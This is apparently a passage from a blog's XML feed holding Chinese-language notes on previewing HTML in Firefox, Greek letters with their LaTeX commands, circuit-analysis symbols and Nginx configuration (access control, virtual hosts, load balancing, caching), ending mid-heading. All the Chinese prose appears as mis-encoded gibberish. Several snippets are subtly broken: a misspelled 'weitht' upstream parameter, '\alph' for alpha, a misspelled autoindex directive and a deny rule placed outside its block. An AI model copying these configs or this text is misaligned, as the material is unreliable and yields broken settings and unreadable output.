    <link href="/2022/10/03/%E5%9C%A8-Linux-%E4%B8%8B%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%A2%84%E8%A7%88-html-%E6%96%87%E4%BB%B6/"/>
    <url>/2022/10/03/%E5%9C%A8-Linux-%E4%B8%8B%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%A2%84%E8%A7%88-html-%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>ç”¨ <code>firefox + file.html</code> å³å¯:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ firefox test.html<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Greek-alphabets-çš„è¯»æ³•</title>
    <link href="/2022/10/03/Greek-alphabets-%E7%9A%84%E8%AF%BB%E6%B3%95/"/>
    <url>/2022/10/03/Greek-alphabets-%E7%9A%84%E8%AF%BB%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><img src="/../img/greek_alphabet1.png" alt="Greek alphabets"><br><img src="/../img/greek_alphabet2.png" alt="Greek alphabets"></p><h1 id="å¦ä¸€è¡¨"><a href="#å¦ä¸€è¡¨" class="headerlink" title="å¦ä¸€è¡¨"></a>å¦ä¸€è¡¨</h1><table><thead><tr><th>å­—æ¯</th><th>å…¬å¼</th></tr></thead><tbody><tr><td>Î±</td><td>\alph</td></tr><tr><td>Î²</td><td>\beta</td></tr><tr><td>Î³</td><td>\gamma</td></tr><tr><td>Î“</td><td>\Gamma</td></tr><tr><td>Î´</td><td>\delta</td></tr><tr><td>Î”</td><td>\Delta</td></tr><tr><td>Ïµ</td><td>\epsilon</td></tr><tr><td>Îµ</td><td>\varepsilon</td></tr><tr><td>Î¶</td><td>\zeta</td></tr><tr><td>Î·</td><td>\eta</td></tr><tr><td>Î¸</td><td>\theta</td></tr><tr><td>Î˜</td><td>\Theta</td></tr><tr><td>Ï‘</td><td>\vartheta</td></tr><tr><td>Î¹</td><td>\iota</td></tr><tr><td>Îº</td><td>\kappa</td></tr><tr><td>Î»</td><td>\lambda</td></tr><tr><td>Î›</td><td>\Lambda</td></tr><tr><td>Î¼</td><td>\mu</td></tr><tr><td>Î½</td><td>\nu</td></tr><tr><td>Î¾</td><td>\xi</td></tr><tr><td>Î</td><td>\Xi</td></tr><tr><td>Ï€</td><td>\pi</td></tr><tr><td>Î </td><td>\Pi</td></tr><tr><td>Ï–</td><td>\varpi</td></tr><tr><td>Ï</td><td>\rho</td></tr><tr><td>Ï±</td><td>\varrho</td></tr><tr><td>Ïƒ</td><td>\sigma</td></tr><tr><td>Î£</td><td>\Sigma</td></tr><tr><td>Ï‚</td><td>\varsigma</td></tr><tr><td>Ï„</td><td>\tau</td></tr><tr><td>Ï…</td><td>\upsilon</td></tr><tr><td>Î¥</td><td>\Upsilon</td></tr><tr><td>Ï•</td><td>\phi</td></tr><tr><td>Î¦</td><td>\Phi</td></tr><tr><td>Ï†</td><td>\varphi</td></tr><tr><td>Ï‡</td><td>\chi</td></tr><tr><td>Ïˆ</td><td>\psi</td></tr><tr><td>Î¨</td><td>\Psi</td></tr><tr><td>Î©</td><td>\Omega</td></tr><tr><td>Ï‰</td><td>\omega</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CAD-éƒ¨åˆ†ç¬”è®°</title>
    <link href="/2022/10/03/CAD-%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/10/03/CAD-%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>CAD æ˜¯ Circuit Analysis and Design.</p><h1 id="æ ‡è¯†"><a href="#æ ‡è¯†" class="headerlink" title="æ ‡è¯†"></a>æ ‡è¯†</h1><h2 id="ç”µæº"><a href="#ç”µæº" class="headerlink" title="ç”µæº"></a>ç”µæº</h2><p><img src="/../img/the_sign_of_source.png" alt="source"></p><p>ç–‘é—®:</p><ul><li>è¿™ä¸ªç”µæµç”µæºçš„ç®­å¤´è¡¨ç¤ºæ–¹å‘å—, å¥½åƒç¡®å®æ˜¯</li><li></li></ul><p>äº¤æµç”µ:<br><img src="/../img/ac_source.png" alt="AC source"></p><p>ä¸ä¸²è”å¹¶è”ç»“åˆ:<br><img src="/../img/serial_parallel_source.png" alt="serial and parallel"></p><h2 id="Resistor-Inductor-and-Capacitor"><a href="#Resistor-Inductor-and-Capacitor" class="headerlink" title="Resistor, Inductor and Capacitor"></a>Resistor, Inductor and Capacitor</h2><p><img src="/../img/resistor_inductor_capacitor.png" alt="Resistor, Inductor and Capacitor"></p><h2 id="Dependent-Sources"><a href="#Dependent-Sources" class="headerlink" title="Dependent Sources"></a>Dependent Sources</h2><p><img src="/../img/dependent_source.png" alt="dependent_source"></p><h3 id="ä¸ºä»€ä¹ˆå«-Dependent-Sources"><a href="#ä¸ºä»€ä¹ˆå«-Dependent-Sources" class="headerlink" title="ä¸ºä»€ä¹ˆå« Dependent Sources"></a>ä¸ºä»€ä¹ˆå« Dependent Sources</h3><p>å› ä¸ºå®ƒçš„ç”µå‹æˆ–ç”µæµå¤§å°å–å†³ä¸ç”µè·¯ä¸­çš„å…¶ä»–ç”µæº.</p><h1 id="Dirac-Delta-Function"><a href="#Dirac-Delta-Function" class="headerlink" title="Dirac Delta Function"></a>Dirac Delta Function</h1>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx-é«˜æ€§èƒ½-Web-æœåŠ¡å™¨å®æˆ˜æ•™ç¨‹-Notes</title>
    <link href="/2022/10/02/Nginx-%E9%AB%98%E6%80%A7%E8%83%BD-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9E%E6%88%98%E6%95%99%E7%A8%8B-Notes/"/>
    <url>/2022/10/02/Nginx-%E9%AB%98%E6%80%A7%E8%83%BD-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9E%E6%88%98%E6%95%99%E7%A8%8B-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬4ç« -Nginx-åŸºæœ¬é…ç½®"><a href="#ç¬¬4ç« -Nginx-åŸºæœ¬é…ç½®" class="headerlink" title="ç¬¬4ç«  Nginx åŸºæœ¬é…ç½®"></a>ç¬¬4ç«  Nginx åŸºæœ¬é…ç½®</h1><p>Nginx æ‰€æœ‰åŠŸèƒ½çš„å®ç°, éƒ½æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶çš„è®¾ç½®å®Œæˆçš„.</p><p><code>#</code> æ˜¯æ³¨é‡Šç¬¦.</p><h3 id="4-1-2-è®¾ç½®ç”¨æˆ·å’Œç»„"><a href="#4-1-2-è®¾ç½®ç”¨æˆ·å’Œç»„" class="headerlink" title="4.1.2 è®¾ç½®ç”¨æˆ·å’Œç»„"></a>4.1.2 è®¾ç½®ç”¨æˆ·å’Œç»„</h3><h3 id="4-1-3-è‡ªå®šä¹‰é”™è¯¯é¡µ"><a href="#4-1-3-è‡ªå®šä¹‰é”™è¯¯é¡µ" class="headerlink" title="4.1.3 è‡ªå®šä¹‰é”™è¯¯é¡µ"></a>4.1.3 è‡ªå®šä¹‰é”™è¯¯é¡µ</h3><h4 id="1-ä¸ºæ¯ç§ç±»å‹çš„é”™è¯¯è®¾ç½®å•ç‹¬çš„å¤„ç†æ–¹å¼"><a href="#1-ä¸ºæ¯ç§ç±»å‹çš„é”™è¯¯è®¾ç½®å•ç‹¬çš„å¤„ç†æ–¹å¼" class="headerlink" title="1. ä¸ºæ¯ç§ç±»å‹çš„é”™è¯¯è®¾ç½®å•ç‹¬çš„å¤„ç†æ–¹å¼"></a>1. ä¸ºæ¯ç§ç±»å‹çš„é”™è¯¯è®¾ç½®å•ç‹¬çš„å¤„ç†æ–¹å¼</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">error_page</span> <span class="hljs-number">403</span> /<span class="hljs-number">40</span>x.html;<br><span class="hljs-attribute">error_page</span> <span class="hljs-number">404</span> /<span class="hljs-number">404</span>.jpg;<br></code></pre></td></tr></table></figure><h4 id="2-åˆ©ç”¨åœ¨çº¿èµ„æºè¿›è¡Œé”™è¯¯å¤„ç†"><a href="#2-åˆ©ç”¨åœ¨çº¿èµ„æºè¿›è¡Œé”™è¯¯å¤„ç†" class="headerlink" title="2. åˆ©ç”¨åœ¨çº¿èµ„æºè¿›è¡Œé”™è¯¯å¤„ç†"></a>2. åˆ©ç”¨åœ¨çº¿èµ„æºè¿›è¡Œé”™è¯¯å¤„ç†</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">error_page <span class="hljs-number">403</span> http:<span class="hljs-regexp">//</span>example.com/forbidden.html;<br></code></pre></td></tr></table></figure><h4 id="æ›´æ”¹å“åº”çŠ¶æ€ç "><a href="#æ›´æ”¹å“åº”çŠ¶æ€ç " class="headerlink" title="æ›´æ”¹å“åº”çŠ¶æ€ç "></a>æ›´æ”¹å“åº”çŠ¶æ€ç </h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">error_page</span> <span class="hljs-number">403</span>=<span class="hljs-number">200</span> /<span class="hljs-number">40</span>x.html;<br></code></pre></td></tr></table></figure><h2 id="4-2-è®¿é—®æ§åˆ¶"><a href="#4-2-è®¿é—®æ§åˆ¶" class="headerlink" title="4.2 è®¿é—®æ§åˆ¶"></a>4.2 è®¿é—®æ§åˆ¶</h2><h3 id="4-2-1-æƒé™æ§åˆ¶æŒ‡ä»¤"><a href="#4-2-1-æƒé™æ§åˆ¶æŒ‡ä»¤" class="headerlink" title="4.2.1 æƒé™æ§åˆ¶æŒ‡ä»¤"></a>4.2.1 æƒé™æ§åˆ¶æŒ‡ä»¤</h3><p>ä¸¤ä¸ªç”¨äºé…ç½®è®¿é—®æƒé™çš„æŒ‡ä»¤:</p><ul><li>allow</li><li>deny<br>æŒ‡ä»¤åæ¥ IP, IP æ®µæˆ– all.</li></ul><p>åœ¨å†…å±‚ä¸­çš„è®¾ç½®ä¼˜å…ˆçº§æ›´é«˜. åœ¨åŒä¸€ä¸ªå—ä¸­, å…ˆå‡ºç°çš„ä¼˜å…ˆçº§æ›´é«˜.</p><p>æ‰€ä»¥è¿™ä¸ªæƒé™æ§åˆ¶ä¸€èˆ¬æ”¾åœ¨æ¨¡å—çš„æœ€å.</p><p>å¦‚:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">allow</span> <span class="hljs-number">192.168.78.128</span>;<br><span class="hljs-attribute">deny</span> <span class="hljs-literal">all</span>;<br></code></pre></td></tr></table></figure><h3 id="4-2-2-è®¿é—®æ§åˆ¶å…¸å‹åº”ç”¨"><a href="#4-2-2-è®¿é—®æ§åˆ¶å…¸å‹åº”ç”¨" class="headerlink" title="4.2.2 è®¿é—®æ§åˆ¶å…¸å‹åº”ç”¨"></a>4.2.2 è®¿é—®æ§åˆ¶å…¸å‹åº”ç”¨</h3><p>å¯¹äºç½‘ç«™ä¸‹çš„ admin ç›®å½•ä»…å…è®¸ç®¡ç†å‘˜èº«ä»½çš„ç”¨æˆ·è®¿é—®.</p><p>location å—çš„å‰ç¼€:<br><img src="/../img/prefix_of_location_block.png" alt="location å—çš„å‰ç¼€"></p><p>location å—æ˜¯, åŒ¹é…æˆåŠŸäº†ä¹‹åå°±æ‰§è¡Œåé¢çš„ä»£ç å—.</p><p>å¦‚:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">/admin</span>/auth &#123;<br>    allow <span class="hljs-number">192.168</span>.<span class="hljs-number">78.200</span>;<br>&#125;<br><span class="hljs-keyword">deny</span> all;<br></code></pre></td></tr></table></figure><h4 id="3-æœ€å¤§å‰ç¼€åŒ¹é…"><a href="#3-æœ€å¤§å‰ç¼€åŒ¹é…" class="headerlink" title="3. æœ€å¤§å‰ç¼€åŒ¹é…"></a>3. æœ€å¤§å‰ç¼€åŒ¹é…</h4><p>æ™®é€šçš„ location ä¹‹é—´éµå¾ª â€œæœ€å¤§å‰ç¼€åŒ¹é…åŸåˆ™â€, åŒ¹é…åº¦æœ€é«˜çš„ location å°†ä¼šæ‰§è¡Œ.</p><h2 id="4-3-æ—¥å¿—æ–‡ä»¶"><a href="#4-3-æ—¥å¿—æ–‡ä»¶" class="headerlink" title="4.3 æ—¥å¿—æ–‡ä»¶"></a>4.3 æ—¥å¿—æ–‡ä»¶</h2><p>Nginx å¯ä»¥ä½¿æ¯ä¸ªå—çš„é…ç½®æ‹¥æœ‰å„è‡ªç‹¬ç«‹çš„æ—¥å¿—è¿›è¡Œè®°å½•.</p><p>å¯ä»¥åˆ†ä¸º:</p><ul><li>è®¿é—®æ—¥å¿—</li><li>é”™è¯¯æ—¥å¿—</li></ul><h2 id="4-4-è™šæ‹Ÿä¸»æœº"><a href="#4-4-è™šæ‹Ÿä¸»æœº" class="headerlink" title="4.4 è™šæ‹Ÿä¸»æœº"></a>4.4 è™šæ‹Ÿä¸»æœº</h2><h3 id="4-4-2-åŸºäºç«¯å£å·é…ç½®è™šæ‹Ÿä¸»æœº"><a href="#4-4-2-åŸºäºç«¯å£å·é…ç½®è™šæ‹Ÿä¸»æœº" class="headerlink" title="4.4.2 åŸºäºç«¯å£å·é…ç½®è™šæ‹Ÿä¸»æœº"></a>4.4.2 åŸºäºç«¯å£å·é…ç½®è™šæ‹Ÿä¸»æœº</h3><p>ä¸€ä¸ª Nginx ç›‘å¬å¤šä¸ªç«¯å£, æ ¹æ®ä¸åŒçš„ç«¯å£å·, æ¥åŒºåˆ†ä¸åŒçš„ç½‘ç«™.</p><p>è‹¥è¦åœ¨ Nginx ä¸­é…ç½®ä¸€ä¸ªè™šæ‹Ÿä¸»æœº, åªéœ€åœ¨ http å—ä¸­æ·»åŠ ä¸€ä¸ª server å—å³å¯. ä¹Ÿå°±æ˜¯è¯´, http å—ä¸­çš„æ¯ä¸ª server å—éƒ½æ˜¯ä¸€ä¸ªè™šæ‹Ÿä¸»æœº.</p><p><code>server_name</code> æŒ‡ä»¤ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ (<code>*</code>)ä¸æ­£åˆ™è¡¨è¾¾å¼æ¥è®¾ç½®åŸŸå:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">server_name</span> <span class="hljs-regexp">*.test.com</span>;<br></code></pre></td></tr></table></figure><h3 id="4-4-5-è®¾ç½®ç›®å½•åˆ—è¡¨"><a href="#4-4-5-è®¾ç½®ç›®å½•åˆ—è¡¨" class="headerlink" title="4.4.5 è®¾ç½®ç›®å½•åˆ—è¡¨"></a>4.4.5 è®¾ç½®ç›®å½•åˆ—è¡¨</h3><p>Nginx é»˜è®¤æ˜¯ä¸å…è®¸åˆ—å‡ºæ•´ä¸ªç›®å½•çš„.</p><p>å¼€å¯ç›®å½•åˆ—è¡¨åŠŸèƒ½å, å¯ä»¥è®©è¯¥ç«™ç‚¹æˆ–ç›®å½•ä¸‹çš„æ–‡ä»¶ä»¥åˆ—è¡¨çš„å½¢å¼å±•ç¤º.</p><p>å¼€å¯:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;<br></code></pre></td></tr></table></figure><p>åœ¨ http å—ä¸­, è¡¨ç¤ºå¯¹äºæ‰€æœ‰ç«™ç‚¹éƒ½æœ‰æ•ˆ, åœ¨ server å—ä¸­, è¡¨ç¤ºå¯¹æŒ‡å®šç«™ç‚¹æœ‰æ•ˆ, åœ¨ location å—ä¸­, è¡¨ç¤ºå¯¹æŸä¸ªç›®å½•èµ·ä½œç”¨.</p><h4 id="æ˜¾ç¤ºæ–‡ä»¶çš„æ—¶é—´æ ¼å¼ä¸å¤§å°"><a href="#æ˜¾ç¤ºæ–‡ä»¶çš„æ—¶é—´æ ¼å¼ä¸å¤§å°" class="headerlink" title="æ˜¾ç¤ºæ–‡ä»¶çš„æ—¶é—´æ ¼å¼ä¸å¤§å°"></a>æ˜¾ç¤ºæ–‡ä»¶çš„æ—¶é—´æ ¼å¼ä¸å¤§å°</h4><p><code>audoindex_exact_size</code> æŒ‡ä»¤è®¾ç½®ç²¾ç¡®æ˜¾ç¤ºæ–‡ä»¶å¤§å°è¿˜æ˜¯å¤§æ¦‚æ˜¾ç¤ºæ–‡ä»¶å¤§å°. </p><p><code>autoindex_localtime</code> æŒ‡ä»¤è®¾ç½®æ–‡ä»¶æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´çš„æ ¼å¼.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">autoindex_exact_size</span> <span class="hljs-literal">off</span>; <span class="hljs-comment"># ä»¥ KB/MB/GB æ˜¾ç¤º</span><br><span class="hljs-attribute">autoindex_localtime</span>  <span class="hljs-literal">on</span>;<br></code></pre></td></tr></table></figure><h3 id="4-4-6-å­é…ç½®æ–‡ä»¶çš„å¼•å…¥"><a href="#4-4-6-å­é…ç½®æ–‡ä»¶çš„å¼•å…¥" class="headerlink" title="4.4.6 å­é…ç½®æ–‡ä»¶çš„å¼•å…¥"></a>4.4.6 å­é…ç½®æ–‡ä»¶çš„å¼•å…¥</h3><h1 id="ç¬¬6ç« -è´Ÿè½½å‡è¡¡ä¸ç¼“å­˜"><a href="#ç¬¬6ç« -è´Ÿè½½å‡è¡¡ä¸ç¼“å­˜" class="headerlink" title="ç¬¬6ç«  è´Ÿè½½å‡è¡¡ä¸ç¼“å­˜"></a>ç¬¬6ç«  è´Ÿè½½å‡è¡¡ä¸ç¼“å­˜</h1><h3 id="6-1-1-ä»£ç†ä¸åå‘ä»£ç†"><a href="#6-1-1-ä»£ç†ä¸åå‘ä»£ç†" class="headerlink" title="6.1.1 ä»£ç†ä¸åå‘ä»£ç†"></a>6.1.1 ä»£ç†ä¸åå‘ä»£ç†</h3><p>å¹³æ—¶ç›´æ¥çš„ç§°ä»£ç†å°±æ˜¯æ­£å‘ä»£ç†.</p><p>æ­£å‘ä»£ç†, ä½ è¿˜æ˜¯ç›´æ¥å‘ç›®æ ‡æœåŠ¡å™¨å‘èµ·è¯·æ±‚, åªä¸è¿‡è¿™ä¸ªè¯·æ±‚è¦å…ˆåˆ°è¾¾ä»£ç†æœåŠ¡å™¨.</p><p>åå‘ä»£ç†, ä½ æ˜¯ç›´æ¥å‘åå‘ä»£ç†æœåŠ¡å™¨å‘èµ·è¯·æ±‚.</p><h3 id="6-1-2-åå‘ä»£ç†æœåŠ¡é…ç½®"><a href="#6-1-2-åå‘ä»£ç†æœåŠ¡é…ç½®" class="headerlink" title="6.1.2 åå‘ä»£ç†æœåŠ¡é…ç½®"></a>6.1.2 åå‘ä»£ç†æœåŠ¡é…ç½®</h3><p>Nginx æœåŠ¡å™¨ä¸­, åå‘ä»£ç†çš„é…ç½®ä¸»è¦ç”¨ <code>proxy_pass</code> æŒ‡ä»¤. (ç›´è§‚çœ‹è¿™ä¸¤ä¸ªå•è¯, proxy æ˜¯ä»£ç†, pass æ˜¯ä¼ é€’, å°±æ˜¯å°†åå‘ä»£ç†æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚è½¬ç§»ç»™åæ–¹çœŸæ­£å­˜å‚¨èµ„æºçš„æœåŠ¡å™¨)</p><h2 id="6-2-è´Ÿè½½å‡è¡¡"><a href="#6-2-è´Ÿè½½å‡è¡¡" class="headerlink" title="6.2 è´Ÿè½½å‡è¡¡"></a>6.2 è´Ÿè½½å‡è¡¡</h2><h3 id="6-2-2-è´Ÿè½½å‡è¡¡çš„é…ç½®"><a href="#6-2-2-è´Ÿè½½å‡è¡¡çš„é…ç½®" class="headerlink" title="6.2.2 è´Ÿè½½å‡è¡¡çš„é…ç½®"></a>6.2.2 è´Ÿè½½å‡è¡¡çš„é…ç½®</h3><p>é€šè¿‡ Nginx ä¸­çš„ upstream æŒ‡ä»¤.</p><p>æœ‰å››ç§å®ç°è´Ÿè½½å‡è¡¡çš„æ–¹å¼:<br><img src="/../img/upstream.png" alt="è´Ÿè½½å‡è¡¡"></p><p>åœ¨ upstream æŒ‡å®šçš„æœåŠ¡å™¨ç»„ä¸­, è‹¥æ¯ä¸ªæœåŠ¡å™¨çš„æƒé‡éƒ½è®¾ç½®ä¸º 1 (é»˜è®¤å€¼) æ—¶, è¡¨ç¤ºå½“å‰çš„è´Ÿè½½å‡è¡¡æ˜¯ä¸€èˆ¬è½®å¾ªæ–¹å¼.</p><p><code>upstream</code> æŒ‡ä»¤æŒ‡å®šçš„æœåŠ¡å™¨ç”¨äºå…¶å‰é¢çš„ <code>proxy_pass</code> æ‰€æŒ‡å®šçš„æœåŠ¡å™¨.</p><p>å¦‚:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>      <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> test.com;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://web_server;<br>    &#125;<br>&#125;<br><br><span class="hljs-section">upstream</span> web_server &#123;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.78.128</span>;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.78.200</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´, <code>/</code> å³ä»»æ„è¯·æ±‚, æˆ–è¢« pass åˆ° <code>http://web_server</code>, è€Œ <code>http://web_server</code> åˆæ˜¯ç”±ä¸¤ä¸ª server ç»„æˆ.</p><h4 id="2-åŠ æƒè½®å¾ª"><a href="#2-åŠ æƒè½®å¾ª" class="headerlink" title="2. åŠ æƒè½®å¾ª"></a>2. åŠ æƒè½®å¾ª</h4><p>ä½¿ç”¨ <code>weight</code> å‚æ•°è®¾ç½®æƒé‡å¤§å°:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">upstream web_server &#123;<br>   <span class="hljs-built_in"> server </span>192.168.78.128 <span class="hljs-attribute">weitht</span>=1;<br>   <span class="hljs-built_in"> server </span>192.168.78.200 <span class="hljs-attribute">weitht</span>=3;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä»–çŠ¶æ€å‚æ•°:<br><img src="/../img/state_args.png" alt="state_args"></p><p>è®¾ç½®ä¸º <code>backup</code> çš„æœåŠ¡å™¨, åªæœ‰å½“å…¶ä»–æ‰€æœ‰çš„é <code>backup</code> æœºå™¨å‡ºç°æ•…éšœæˆ–è€…å¿™ç¢Œçš„æƒ…å†µä¸‹, æ‰ä¼šè¯·æ±‚ <code>backup</code> æœåŠ¡å™¨.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> web_server &#123;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.78.128</span> weitht=<span class="hljs-number">1</span>;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.78.200</span> weitht=<span class="hljs-number">3</span>;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.78.201</span> backup;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-ip-hash-è´Ÿè½½å‡è¡¡"><a href="#3-ip-hash-è´Ÿè½½å‡è¡¡" class="headerlink" title="3. ip_hash è´Ÿè½½å‡è¡¡"></a>3. <code>ip_hash</code> è´Ÿè½½å‡è¡¡</h4><p>å°†æ¯ä¸ªè¯·æ±‚æŒ‰ç…§è®¿é—® IP çš„ hash ç»“æœåˆ†é…, ä½¿å¾—æ¥è‡ªåŒä¸€ä¸ª IP çš„å®¢æˆ·ç«¯å›ºå®šè®¿é—®ä¸€å° Web æœåŠ¡å™¨. è§£å†³åŠ¨æ€ç½‘é¡µå­˜åœ¨çš„ Session å…±äº«é—®é¢˜.</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">upstream web_server &#123;<br>    ip_hash<span class="hljs-comment">;</span><br>    server <span class="hljs-number">192.168</span>.<span class="hljs-number">78.128</span><span class="hljs-comment">;</span><br>    server <span class="hljs-number">192.168</span>.<span class="hljs-number">78.200</span><span class="hljs-comment">;</span><br>    server <span class="hljs-number">192.168</span>.<span class="hljs-number">78.201</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>ip_hash</code> æ–¹å¼å¤„ç†è´Ÿè½½å‡è¡¡æ—¶, Web æœåŠ¡å™¨åœ¨è´Ÿè½½å‡è¡¡åˆ—è¡¨ä¸­çš„çŠ¶æ€ä¸èƒ½ä½¿ç”¨ weight å’Œ backup è®¾ç½®.</p><h4 id="4-åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—"><a href="#4-åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—" class="headerlink" title="4. åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—"></a>4. åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—</h4><h2 id="6-3-ç¼“å­˜é…ç½®"><a href="#6-3-ç¼“å­˜é…ç½®" class="headerlink" title="6.3 ç¼“å­˜é…ç½®"></a>6.3 ç¼“å­˜é…ç½®</h2><h3 id="6-3-2-æ°¸ä¹…ç¼“å­˜é…ç½®"><a href="#6-3-2-æ°¸ä¹…ç¼“å­˜é…ç½®" class="headerlink" title="6.3.2 æ°¸ä¹…ç¼“å­˜é…ç½®"></a>6.3.2 æ°¸ä¹…ç¼“å­˜é…ç½®</h3><p>Nginx æä¾›çš„ <code>proxy_store</code> æŒ‡ä»¤å¯ä»¥ç”¨äºå°†å†…å®¹æºæœåŠ¡å™¨å“åº”çš„å†…å®¹ç¼“å­˜åˆ°æœ¬åœ°, è‹¥ä¸æ‰‹åŠ¨åˆ é™¤, è¯¥ç¼“å­˜æ–‡ä»¶ä¼šä¸€ç›´ç”Ÿæ•ˆ.</p><p>å¦‚:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>      <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> <span class="hljs-number">192.168.78.3</span>;<br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">root</span> cache; <br>        <span class="hljs-attribute">proxy_store</span> <span class="hljs-literal">on</span>;                             <span class="hljs-comment"># å¼€å¯æœ¬åœ°ç¼“å­˜</span><br>        <span class="hljs-attribute">proxy_store_access</span> user:rw group:rw all:r;  <span class="hljs-comment"># è®¾ç½®è¯»å†™æƒé™</span><br>        <span class="hljs-attribute">proxy_temp_path</span> cache_tmp;                  <span class="hljs-comment"># è®¾ç½®ä¸´æ—¶ç›®å½•</span><br>        <span class="hljs-attribute">if</span> (!-e <span class="hljs-variable">$request_filename</span>) &#123;<br>            <span class="hljs-attribute">proxy_pass</span> http://192.168.78.128;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>cache</code> è¿™ä¸ªç›®å½•çš„æƒé™è¦ä¸ Nginx å·¥ä½œè¿›ç¨‹ (<code>worker_process</code>)ç›¸åŒ.</p><h3 id="6-3-3-ä¸´æ—¶ç¼“å­˜é…ç½®"><a href="#6-3-3-ä¸´æ—¶ç¼“å­˜é…ç½®" class="headerlink" title="6.3.3 ä¸´æ—¶ç¼“å­˜é…ç½®"></a>6.3.3 ä¸´æ—¶ç¼“å­˜é…ç½®</h3><h3 id="6-3-4-ç¼“å­˜æ¸…ç†é…ç½®"><a href="#6-3-4-ç¼“å­˜æ¸…ç†é…ç½®" class="headerlink" title="6.3.4 